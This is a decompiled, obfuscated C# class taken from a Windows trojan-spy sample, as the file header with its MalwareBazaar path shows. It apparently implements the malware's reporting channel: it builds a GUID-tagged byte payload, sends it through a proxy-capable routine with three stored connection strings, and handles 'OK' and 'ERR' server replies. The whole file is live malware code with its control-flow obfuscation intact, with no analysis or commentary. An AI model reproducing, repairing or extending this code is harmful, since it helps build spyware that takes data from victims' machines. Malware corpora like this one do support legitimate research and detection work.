// Decompiled with JetBrains decompiler
// Type: #de.#ge
// Assembly: qouzb, Version=0.0.0.0, Culture=neutral, PublicKeyToken=34256fcd934ca661
// MVID: 528C9DDA-94F5-4688-B6FB-056FFA07C362
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Generic-6c64cd522d7e6f3c0b6f0116271cde81e35213ad4a360fe569f48f99fd473e62.exe

using \u0023de;
using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0023de
{
  internal class \u0023ge
  {
    internal IWebProxy \u0023ee;
    internal \u0023of \u0023fe;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0023ge()
    {
    }

    internal class \u0023ne
    {
      private readonly \u0023ge \u0023he;
      private readonly byte[] \u0023ie;
      private readonly \u0023wg \u0023je;
      private readonly \u0023ge.\u0023ue \u0023ke;
      public bool \u0023le;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023ne([In] \u0023ge obj0, [In] byte[] obj1, [In] \u0023wg obj2, [In] \u0023ge.\u0023ue obj3)
      {
        int num = 2;
        if (\u0023ge.\u0023ne.Gejx59K8F4gnW3lHuXO())
          goto label_2;
label_1:
        this.\u0023je = obj2;
        goto label_6;
label_2:
        while (true)
        {
          switch (num)
          {
            case 0:
              goto label_1;
            case 1:
            case 5:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              this.\u0023he = obj0;
              this.\u0023ke = obj3;
              num = 0;
              continue;
            case 2:
              this.\u0023le = true;
              if (true)
              {
                num = 5;
                continue;
              }
              goto label_6;
            case 3:
            case 4:
              goto label_6;
            case 6:
              goto label_7;
            default:
              if (!\u0023ge.\u0023ne.ldH4GnKUTOONNJ4xJ3G())
              {
                num = 4;
                continue;
              }
              goto case 1;
          }
        }
label_7:
        return;
label_6:
        this.\u0023ie = obj1;
        num = 6;
        goto label_2;
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      public void \u0023me([In] string obj0)
      {
        int num1 = 1;
        \u0023ge.\u0023pe pe;
        while (true)
        {
          int num2 = num1;
          byte[] destinationArray;
          byte[] bytes;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 1:
                goto label_12;
              case 2:
                Array.Copy((Array) bytes, (Array) destinationArray, bytes.Length);
                goto case 6;
              case 3:
                goto label_3;
              case 4:
              case 5:
                pe = new \u0023ge.\u0023pe(this.\u0023he);
                \u0023wg je = this.\u0023je;
                string re = this.\u0023ke.\u0023re;
                string se = this.\u0023ke.\u0023se;
                string te = this.\u0023ke.\u0023te;
                \u0023Af af = new \u0023Af(pe.\u0023oe);
                \u0023\u0023.\u0023Mj(te, se, af, je, re, destinationArray);
                num2 = 3;
                continue;
              case 6:
                Array.Copy((Array) this.\u0023ie, 0, (Array) destinationArray, bytes.Length, this.\u0023ie.Length);
                num2 = 4;
                continue;
              case 7:
                goto label_14;
              case 8:
                goto label_2;
              case 9:
                goto label_15;
              default:
                num2 = 6;
                continue;
            }
          }
label_2:
          \u0023\u0023.\u0023bi(this.\u0023he, \u0023yf.\u0023wf);
          num1 = 7;
          continue;
label_12:
          if (!(obj0 == "OK"))
          {
            string str = obj0;
            if (this.\u0023he.\u0023fe != null)
              this.\u0023he.\u0023fe((object) this, new \u0023tf(\u0023yf.\u0023vf, str));
            this.\u0023le = false;
            num1 = 9;
            continue;
          }
          num1 = 8;
          continue;
label_14:
          bytes = Encoding.UTF8.GetBytes("{528C9DDA-94F5-4688-B6FB-056FFA07C362}");
          destinationArray = new byte[bytes.Length + this.\u0023ie.Length];
          num1 = 2;
        }
label_3:
        this.\u0023le = pe.\u0023le;
        return;
label_15:;
      }

      internal static bool Gejx59K8F4gnW3lHuXO() => true;

      internal static bool ldH4GnKUTOONNJ4xJ3G() => false;
    }

    private class \u0023pe
    {
      private readonly \u0023ge \u0023he;
      public bool \u0023le;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023pe([In] \u0023ge obj0) => this.\u0023he = obj0;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public void \u0023oe([In] string obj0)
      {
        int num1 = 2;
        if (true)
          goto label_8;
label_1:
        if (obj0.StartsWith("ERR"))
        {
          if (true)
          {
            num1 = 3;
            goto label_8;
          }
        }
        else
          \u0023\u0023.\u0023bi(this.\u0023he, \u0023yf.\u0023xf, string.Empty, obj0);
label_3:
        this.\u0023le = true;
        int num2 = 6;
label_7:
        num1 = num2;
label_8:
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
            case 3:
              \u0023\u0023.\u0023bi(this.\u0023he, \u0023yf.\u0023wf, obj0);
              if (true)
              {
                num1 = 5;
                continue;
              }
              goto label_5;
            case 4:
              goto label_3;
            case 5:
              goto label_5;
            case 6:
              goto label_10;
            default:
              goto label_9;
          }
        }
label_5:
        this.\u0023le = false;
        return;
label_10:
        return;
label_9:
        num2 = 4;
        goto label_7;
      }

      internal static bool lbxv1ZKYOekI2kGcCWp() => true;

      internal static bool d4Lgu0KsjQLnT9RTs8Q() => false;
    }

    internal class \u0023ue
    {
      public static \u0023ge.\u0023ue \u0023qe = new \u0023ge.\u0023ue((string) null, (string) null, (string) null);
      internal readonly string \u0023re;
      internal readonly string \u0023se;
      internal readonly string \u0023te;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023ue([In] string obj0, [In] string obj1, [In] string obj2)
      {
        int num1 = 3;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 1:
                goto label_2;
              case 2:
              case 4:
                goto label_6;
              case 3:
                goto label_1;
              case 5:
                goto label_7;
              default:
                num2 = 4;
                continue;
            }
          }
label_1:
          // ISSUE: explicit constructor call
          base.\u002Ector();
          num1 = 0;
          continue;
label_2:
          this.\u0023re = obj0;
label_6:
          this.\u0023te = obj2;
          this.\u0023se = obj1;
          num1 = 5;
        }
label_7:;
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      static \u0023ue()
      {
      }

      internal static bool VmUYERK6sVNnmav3jcS() => true;

      internal static bool DStd11KP1eUaYgead0N() => false;
    }
  }
}
